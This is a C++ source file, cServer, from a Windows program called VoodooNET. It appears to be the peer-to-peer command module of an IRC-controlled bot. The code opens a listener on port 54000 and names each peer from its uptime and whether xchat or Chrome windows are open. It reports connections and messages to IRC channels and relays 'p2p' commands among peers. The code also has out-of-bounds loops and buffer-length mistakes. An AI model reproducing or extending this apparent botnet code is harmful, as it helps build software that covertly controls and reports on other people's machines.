/*
 *  VoodooNET - a modular multi-threaded program for Windows x86/x64 bit
 *	Coded by VoRTeCKZ - @therealvorteckz
 *  VoRTeCKZ Studios
 *
 *	Copyright (C) 2023 - All Rights Reserved.
 *
 * Permission to ("use, copy, and/or modify") this software for
 * any purpose  with or without fee is hereby granted, provided that the above copyright
 * notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
 * PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */

#include "includes.h"
#include <WS2tcpip.h>
#include <sstream>
#include <iostream>
#include "externs.h"
#include "cCommands.h"
#pragma comment (lib, "Ws2_32.lib")
using namespace::std;
CLIENTS clients[255];



cServer::cServer()
{
	fd_set master;
	FD_ZERO(&master);

	b_cRunning = false;
	m_iClientNum = 0;


}

cServer::~cServer()
{
	Cleanup();
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("cServer:Module", "Destructed");
#endif
}
bool cServer::HandleCommand(char* cmd, char* params, ...)
{
	int iCount = 0;
	list<command*>::iterator ic;
	cString m_sCmd(cmd);
	cString m_sParams(params);
	for (ic = g_cVoodoo->m_cCommands.m_lCommands.begin(); ic != g_cVoodoo->m_cCommands.m_lCommands.end(); ++ic)
	{
		iCount++;
		if (!m_sCmd.CompareNoCase((*ic)->sName.c_str()))
		{
#ifdef _DEBUG
			g_cVoodoo->m_cLogging.PrintLine("cCommands:Registered", "Registered Command: [Command: %s] [Description: %s]", (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif
#ifndef NO_ASTRO
			g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:15Module04]: 04[15CommandNum:00 %d04]:00 %s04] [15Description: 00%s04]", iCount, (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif		
		}
	}
	return true;
}


char* cServer::CreateName()
{
	bool prefix = false;
	const std::string characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	int length = MAX_NICKLEN;
	std::random_device random_device;
	std::mt19937 generator(random_device());
	std::uniform_int_distribution<> distribution(0, (int)characters.size() - 1);

	std::string random_string;

	srand((unsigned int)time(NULL));

	DWORD currentTimeD;
	DWORD tick = (DWORD)GetTickCount64();
	tick /= 1000;
	currentTimeD = (tick / 86400);
	std::stringstream ss;
	if (currentTimeD < 10)
	{
		ss << "[0" << currentTimeD << "|";
		random_string += ss.str();
	}
	else {
		ss << "[" << currentTimeD << "|";
		random_string += ss.str();
	}
	if (FindWindowA("gdkWindowTemp", "xchat.exe"))
	{

		random_string += "X";
		prefix = true;
	}
	if (FindWindowExA(0, 0, "Chrome_WidgetWin_1", 0))
	{

		random_string += "C";
		prefix = true;
	}

	if (prefix)
		random_string += "|";

	for (int i = (int)random_string.length(); i <= MAX_NICKLEN - 2; i++)

		random_string += characters[distribution(generator)];

	random_string += "]";
	char* chr = _strdup(random_string.c_str());

	return chr;
}

int cServer::RawSend(int socket, const char* data, ...)
{

	char tbuffer[255];
	memset(tbuffer, 0, sizeof(tbuffer));
	int ret;
	va_list argp;
	va_start(argp, data);
	vsprintf_s(tbuffer, sizeof(tbuffer), data, argp);
	va_end(argp);

#ifdef _DEBUG
	//g_cVoodoo->m_cLogging.Print("cServer:Raw", "%s", tbuffer);
	//printf("test\r\n");
#endif
	ret = send(socket, tbuffer, (int)strlen(tbuffer), 0);

	return ret;

}

void cServer::Listen()
{
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.PrintLine("cServer:Module", "Listening for clients");
#endif
	m_sListenSock = (int)socket(AF_INET, SOCK_STREAM, 0);
	if (m_sListenSock == INVALID_SOCKET)
	{
		return;

	}

	sockaddr_in hint;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(54000);
	hint.sin_addr.S_un.S_addr = INADDR_ANY;
	bind(m_sListenSock, (sockaddr*)&hint, sizeof(hint));
	listen(m_sListenSock, SOMAXCONN);

}



void cServer::GetReceived(char* data)
{
	char* p;
	while (p = strstr(data, "\r\n"))
	{
		*p = '\0';
		Sleep(100);
		ParseReceived(data);
		data = p + 2;
	}
}
bool cServer::ParseReceived(char* data)
{

	char ntbuffer[IRCLINE];
	strcpy_s(ntbuffer, data);
	for (unsigned int i = (int)strlen(ntbuffer); i > strlen(ntbuffer) - 2; i--)
		if (ntbuffer[i] == '\r' || ntbuffer[i] == '\n')
		{
			ntbuffer[i] = 0;
		}

	cString sLine(data);


	CMessage* pmsg = new CMessage;

	cString szText = strstr(sLine.CStr(), sLine.Token(0, "").Token(0, " ").CStr());
	//pmsg->sChatString.Assign(strstr(sLine.Str(), " :"));
	//char* szText = pmsg->sChatString.Str();
	pmsg->sCmd.Assign(sLine.Token(0, "").Token(0, " ").CStr());
	//pmsg->sParameters.Assign(sLine.Token(1, ":").Token(1, " "));

	pmsg->sParameters.Assign(strstr(szText.CStr(), szText.Token(1, " ")));
	if (!pmsg->sParameters.Compare(pmsg->sCmd.CStr()))
	{
		pmsg->sParameters.Empty();
		pmsg->sParameters.Assign("");
	}
#ifdef _DEBUG
	//		g_cVoodoo->m_cLogging.Print("IRC:DBG", "test: nick[%s] | ident[%s] | host[%s] | chan[%s] | [cmd: %s] | [parameters: %s]\r\n", pmsg->sSrc.CStr(), pmsg->sIdentd.CStr(),/ pmsg->cHost.CStr(), pmsg->sDest.CStr(), pmsg->sCmd.CStr(), pmsg->sParameters.CStr());
#endif

	command* pCommand = g_cVoodoo->m_cCommands.FindCommand(pmsg->sCmd.CStr());
	if (pCommand) return pCommand->cHandle->HandleCommand(pmsg->sCmd.Str(), pmsg->sParameters.Str()); else return false;



	return true;
}
/*progress*/
void cServer::p2pList(int socket)
{

#ifndef NO_P2P
	for (int i = 0; i <= MAX_CLIENTS; i++)
	{
		if (clients[i].socket != NULL && clients[i].name != NULL)
		{
			g_cVoodoo->m_cServer.RawSend(socket, "[cServer:Member] Number Total[%i] Number[%i] Name [%s] Port [%i] Host [%s]\r\n", CalculateClients(), i, clients[i].name, clients[i].port, clients[i].host);
#ifndef NO_IRC
			g_cVoodoo->m_cIRC.sendmsg("[cServer:Member] Number Total[%i] Number[%i] Name [%s] Port [%i] Host [%s]", CalculateClients(), i, clients[i].name, clients[i].port, clients[i].host);
#endif
#ifndef NO_ASTRO
			g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:00Member04]00 Number Total04[00%i04] 15Number04[00%i04]00 Name 04[00%s04]00 Port 04[00%i04] 00Host 04[00%s00]", CalculateClients(), i, clients[i].name, clients[i].port, clients[i].host);
#endif


		}

	}
#endif
	cString voodoo;
}
int cServer::CalculateClients()
{
	int m_iClients = 0;
	for (int i = 0; i < MAX_CLIENTS; i++)
	{
		if (clients[i].socket != NULL && clients[i].name != NULL)
		{
			m_iClients = m_iClients + 1;
			//g_cVoodoo->m_cAstro.sendmsg("Found Client: %i name %s", m_iClients, clients[m_iClients].name);

		}
	}
	return m_iClients;
}

void cServer::Init()
{
	b_cRunning = true;


	//Alocate();
	fd_set master;
#ifdef NO_IRC
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData))
	{
		printf("Unable to initialize Winsock.\r\n");
		Sleep(1000);
		//Init();

	}
#endif
	//Start();
	FD_ZERO(&master);
	//	Start();
	Listen();
	FD_SET(m_sListenSock, &master);

	//int m_iClientNum = 1;
	while (b_cRunning && m_sListenSock != -1)
	{

		fd_set copy = master;
		int yes = 1;
		int socketCount = select(0, &copy, nullptr, nullptr, nullptr);
		for (int i = 0; i < socketCount; i++)
		{
			SOCKET m_sServerSock = copy.fd_array[i];
			//char* nickname = g_cVoodoo->m_cIRC.NickCreate();
			setsockopt(m_sServerSock,
				IPPROTO_TCP,
				TCP_NODELAY,
				(char*)&yes,
				sizeof(int));
			setsockopt(m_sListenSock,
				IPPROTO_TCP,
				TCP_NODELAY,
				(char*)&yes,
				sizeof(int));
			if (m_sServerSock == m_sListenSock)
			{

				SOCKET client = accept(m_sListenSock, nullptr, nullptr);
				int yes = 1;
				setsockopt(client,
					IPPROTO_TCP,
					TCP_NODELAY,
					(char*)&yes,
					sizeof(int));
				char host[INET_ADDRSTRLEN] = "";
				char port[NI_MAXSERV];

				//ZeroMemory(host, NI_MAXHOST);
				//ZeroMemory(port, NI_MAXSERV);


				struct sockaddr_in name;
				socklen_t len = sizeof(name);
				if (getpeername(client, (struct sockaddr*)&name, &len) != 0) {
					perror("getpeername");
				}
				else {
					inet_ntop(AF_INET, &name.sin_addr, host, sizeof NI_MAXHOST);

				}
				if (getnameinfo((sockaddr*)&name, sizeof(name), host, NI_MAXHOST, port, NI_MAXSERV, 0) == 0)
				{

					inet_ntop(AF_INET, &name.sin_addr, host, NI_MAXHOST);
				}
				else
				{
					inet_ntop(AF_INET, &name.sin_addr, host, NI_MAXHOST);
				}

				if (atoi(port) != 0)
				{
					m_iClientNum = m_iClientNum + 1;

					for (int z = 1; z <= m_iClientNum; z++)
					{


						if (clients[z].socket == NULL)
						{

							clients[z].socket = (int)client;

							char* host2 = _strdup(host);
							//g_cVoodoo->m_cAstro.sendmsg("[cServer:Module] Connection: IP(%s) Port(%i)] [%i]", host2, clients[m_iClientNum].port, client);


							FD_SET(client, &master);
							//new progress
							char msg[MAX_DATA_SIZE]; memset(msg, 0, sizeof(msg));

							clients[z].host = host2;
							//				g_cVoodoo->m_cServer.CreateName();
#ifndef NO_P2P
							clients[z].name = g_cVoodoo->m_cServer.CreateName();
#endif
							//clients[z].socket = client;
#ifndef NO_IRC
							g_cVoodoo->m_cIRC.sendmsg("[cServer:Conn]: [Name: %s] [Connection: IP: %s] [Port: %d] [%i]", clients[z].name, host2, atoi(port), client);
#endif
#ifndef NO_ASTRO
							g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:15Conn04]: [15Name:00 %s04] [15Connection IP:00 %s04] [15Port:00 %d04] 04[00%i04]", clients[z].name, host2, atoi(port), client);
#endif
							AddClient(host2, clients[z].name, atoi(port), clients[z].socket);
							sprintf_s(msg, sizeof(msg), "The Voodoo: %s [%i] [%s]\r\n", clients[z].name, z, host2);
							cString welcomeMsg(msg);

							send(client, welcomeMsg.CStr(), welcomeMsg.GetLength() + 1, 0);
#ifdef _DEBUG
							g_cVoodoo->m_cLogging.PrintLine("cServer:Module", "[Name: %s] [Connection: IP: %s] [Port: %d] [%i]", clients[z].name, host2, atoi(port), client);
#endif						

							break;
						}

					}

				}
			}
			else
			{
				char buffer[MAX_DATA_SIZE];
				memset(buffer, 0, MAX_DATA_SIZE);

				int bytesIn = recv(m_sServerSock, buffer, MAX_DATA_SIZE - 1, 0);

				if (bytesIn <= 0)
				{
					closesocket(m_sServerSock);
					FD_CLR(m_sServerSock, &master);

				}
				else
				{
					char host[INET_ADDRSTRLEN] = "";
					char port[NI_MAXSERV]; // service (i.e port) the client is connect on
					struct sockaddr_in name;
					socklen_t len = sizeof(name);
					if (getpeername(m_sServerSock, (struct sockaddr*)&name, &len) != 0) {
						perror("getpeername");
					}
					else
					{
						inet_ntop(AF_INET, &name.sin_addr, host, sizeof NI_MAXHOST);
					}
					if (GetNameInfoA((sockaddr*)&name, sizeof(name), host, NI_MAXHOST, port, NI_MAXSERV, 0) == 0)
					{

						inet_ntop(AF_INET, &name.sin_addr, host, NI_MAXHOST);
					}
					else
					{
						inet_ntop(AF_INET, &name.sin_addr, host, NI_MAXHOST);
					}
					GetReceived(buffer);
					//ParseRecv(buffer);

					if (buffer[0] != NULL)
					{
						for (int z = 0; z <= m_iClientNum; z++)
						{

							if (clients[z].socket == m_sServerSock && buffer != NULL)
							{

								cString m_cCmd(buffer);
								//cString m_cCmd = m_sCmd.Token(0, "").Token(0, " ").CStr();
								//cString m_sParams(m_sCmd.Token(1, " ").CStr());
#ifdef _DEBUG
								g_cVoodoo->m_cLogging.PrintLine("cServer:Recv", "[Name: %s] [Host: %s] [Port: %d] [Message: %s] [Params: %s]", clients[z].name, clients[z].host, clients[z].port, buffer, m_cCmd.Token(1, " ").CStr());
#endif
#ifndef NO_IRC
								g_cVoodoo->m_cIRC.sendmsg("[cServer:Recv]: [Name: %s] [Host: %s] [Port: %d] [Message: %s]", clients[z].name, clients[z].host, clients[z].port, buffer);
#endif
#ifndef NO_ASTRO
								g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:15Recv04]: [15Name:00 %s04] [15Host:00 %s04] [15Port:00 %d04] [15Message:00 %s04]", clients[z].name, clients[z].host, clients[z].port, buffer);
#endif

#ifndef  NO_P2P
//								g_cVoodoo->m_cServer.SendToClients("[%s] [Message: %s]", clients[z].name, buffer);
#endif
							}

						}


						for (unsigned int i = 1; i < master.fd_count; i++)
						{
							SOCKET outSock = master.fd_array[i];
							if (outSock != m_sListenSock && outSock != m_sServerSock)

							{
								for (int y = 1; y < MAX_CLIENTS; y++)
								{

									if (clients[y].port == atoi(port))
									{
										ostringstream ss;
										ss << "[SID: " << m_sServerSock << "] [Name: " << clients[y].name << "] [Message: " << buffer << "]\r\n";

										string strOut = ss.str();

										//char strBuf[2048];
										//sprintf_s(strBuf, 1024, "[Client: %s] [Name: %s] [Host: %s] [Port: %i] [Message: %s]", m_sServerSock, clients[y].name, clients[y].host, atoi(port), buffer);

										send(outSock, strOut.c_str(), (int)strOut.size() + 1, 0);
										//										send(outSock, strBuf, sizeof(strBuf), 0);
									}
								}

							}
							//Sleep(50);
						}
						cString m_sCmd(buffer);
						cString m_cCmd = m_sCmd.Token(0, "").Token(0, " ").CStr();
						cString m_sParams(m_sCmd.Token(1, " ").CStr());
#ifndef NO_P2P
						for (int i = 1; i <= MAX_CLIENTS; i++)
						{
							if (clients[i].socket == m_sServerSock)
							{
								if (!m_cCmd.Find("p2p.test"))
								{
									//g_cVoodoo->m_cLogging.Print("cServer:Read", "[Name: %s] [Host: %s] [Port: %d] [Command: %s]", clients[i].name, clients[i].host, clients[i].port, m_cCmd.CStr());

									g_cVoodoo->m_cServer.RawSend((int)m_sServerSock, "[cServer: %s - %s]\r\n", m_cCmd.Token(0, " ").CStr(), m_sParams.CStr());
									//g_cVoodoo->m_cThread.KillThread(atoi(m_sParams.CStr()));
								}
								if (!m_cCmd.CompareNoCase("p2p.status"))
								{
									int p2pNum = CalculateClients();
#ifndef NO_IRC
									//g_cVoodoo->m_cIRC.sendmsg("[cServer:Module] P2P Server State [UP(%i)]", p2pNum);
#endif
#ifdef _DEBUG
									g_cVoodoo->m_cLogging.Print("cServer:Module", "P2P Server State (UP) [Clients: %i]", p2pNum);
#endif

									g_cVoodoo->m_cServer.SendToClients("[cServer:Module] P2P Server State [UP(%i)]", p2pNum);
								}

								if (!m_cCmd.CompareNoCase("P2P.QUIT"))
								{
									if (clients[i].socket != NULL && clients[i].name != NULL)
									{
										closesocket(clients[i].socket);
										FD_CLR(clients[i].socket, &master);

										clients[i].socket = NULL;
										clients[i].host = NULL;
										clients[i].name = NULL;
										clients[i].port = NULL;
										Sleep(50);
										m_iClientNum = CalculateClients();
									}
								}



								//								break;
							}

						}
#endif

					}
				}
				//	Accept a new message;
			}

		}
	}

	//Cleanup();
}



void cServer::SplitRecv(char* szLine)
{
	char* p;

	while (p = strstr(szLine, "\r\n"))
	{
		*p = '\0';
		ParseRecv(szLine);
		szLine = p + 2;
	}

}
bool cServer::ParseRecv(char* szLine)
{
	cString sLine(szLine);
	g_cVoodoo->m_cLogging.Print("dbg", "%s", sLine.Token(1, " ").CStr());
	return true;
}

void cServer::AddClient(char* host, char* name, int port, int cSocket)
{

	char* host2 = _strdup(host);
	if (clients[m_iClientNum].port == NULL)
	{
		clients[m_iClientNum].socket = cSocket;
		clients[m_iClientNum].port = port;
		clients[m_iClientNum].host = host2;
		clients[m_iClientNum].name = name;
	}
	return;

}
bool cServer::b_cCheckRunning() { return b_cRunning; }

void cServer::SendToClients(const char* msg, ...)
{


#ifdef _DEBUG
	//	g_cVoodoo->m_cLogging.Print("cIRC:Module", "IRC Module Not Loaded");
	//	return 0;
#endif

	char tbuffer[(IRCLINE - (MAX_NICKLEN + 10))];
	memset(tbuffer, 0, sizeof(tbuffer));

	va_list argp;
	va_start(argp, msg);
	vsnprintf(tbuffer, sizeof(tbuffer), msg, argp);
	va_end(argp);

	Sleep(50);

	for (int i = 1; i <= MAX_CLIENTS; i++)
	{
		if (clients[i].socket != NULL)
			int ret = RawSend(clients[i].socket, "%s\r\n", tbuffer);
	}


}


void cServer::ClearClients()
{
	for (int i = 1; i <= MAX_CLIENTS; i++)
	{
		if (clients[i].socket != NULL)
		{
#ifndef NO_IRC
			//		g_cVoodoo->m_cAstro.sendmsg("[cServer:ClientClose] %s", clients[i].name);
#endif
			closesocket(clients[i].socket);
			FD_CLR(clients[i].socket, &master);
			clients[i].socket = NULL;
			clients[i].name = NULL;
			clients[i].port = NULL;
		}
	}
	m_iClientNum = 0;
	//b_cRunning = FALSE;
	for (int i = 1; i <= MAX_CLIENTS; i++)
	{
		FD_CLR(clients[i].socket, &master);
		closesocket(clients[i].socket);

	}
	//Cleanup();
	//Init();
}
void cServer::Cleanup()
{
	for (int i = 1; i <= MAX_CLIENTS; i++)
	{
		FD_CLR(clients[i].socket, &master);
		closesocket(clients[i].socket);

	}
	FD_CLR(m_sListenSock, &master);
	FD_CLR(m_sServerSock, &master);
	FD_CLR(client, &master);
	closesocket(outSock);
	closesocket(m_sListenSock);
	closesocket(client);
	closesocket(m_sServerSock);
	b_cRunning = false;
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("cServer:ListenServer", "CleanUP Listen Server");
#endif
	//	WSACleanup(); 
}
void cServer::cServerListen(int m_cSocket, int port, ...)
{
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("cServer:Module", "test listen");
#endif
}

DWORD WINAPI ServerDaemonThread(LPVOID param)
{
	NTHREAD serverdaemonthread = *((NTHREAD*)param);
	NTHREAD* serverdaemonthreads = (NTHREAD*)param;

	//	threads[serverdaemonthread.threadnum].PFLAG = TRUE;

	g_cVoodoo->m_cServer.Init();

	ExitThread(0);
}